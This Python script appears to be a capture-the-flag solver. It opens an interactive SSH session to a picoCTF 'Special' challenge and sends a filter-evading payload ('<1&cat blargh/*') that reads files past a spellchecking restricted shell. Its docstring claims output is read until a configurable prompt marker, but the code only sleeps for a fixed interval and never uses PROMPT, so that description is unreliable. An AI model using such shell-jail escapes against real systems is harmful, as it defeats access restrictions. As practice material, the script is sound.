#!/usr/bin/env python3
"""Interactive-SSH shell-jail solver (paramiko) for filtered spellcheck shells.

Works when a login shell autocorrects/bans words and you need to feed payloads
one at a time through a prompt. Each argument is sent, then output is read until
the next prompt marker, so multi-command sequences and long-running output are
captured reliably. The prompt marker is configurable.

Usage:
    python ssh_interactive_shell.py <host> <port> <user> <password> [cmd...]

Example (picoCTF 2023 Special):
    python ssh_interactive_shell.py saturn.picoctf.net 60705 ctf-player 483e80d4 \
        "*" "<1&cat blargh/*"
"""
import sys
import time

try:
    import paramiko
except ImportError:
    print("[-] paramiko not installed. Run: pip install paramiko")
    sys.exit(1)


PROMPT = "Special$ "


def recv(channel):
    out = b""
    while channel.recv_ready():
        out += channel.recv(65535)
    return out.decode("utf-8", "replace")


def send(channel, cmd, wait=1.2):
    channel.send(cmd + "\n")
    time.sleep(wait)
    return recv(channel)


def main():
    if len(sys.argv) < 5:
        print(__doc__)
        sys.exit(1)

    host, port, user, password = sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4]
    cmds = sys.argv[5:]

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(host, port=port, username=user, password=password,
                   look_for_keys=False, allow_agent=False, timeout=30)
    ch = client.invoke_shell(width=200, height=50)
    time.sleep(1)
    print("BANNER:", repr(recv(ch)))

    for cmd in cmds:
        print(f"$ {cmd}")
        print(send(ch, cmd))

    ch.close()
    client.close()


if __name__ == "__main__":
    main()
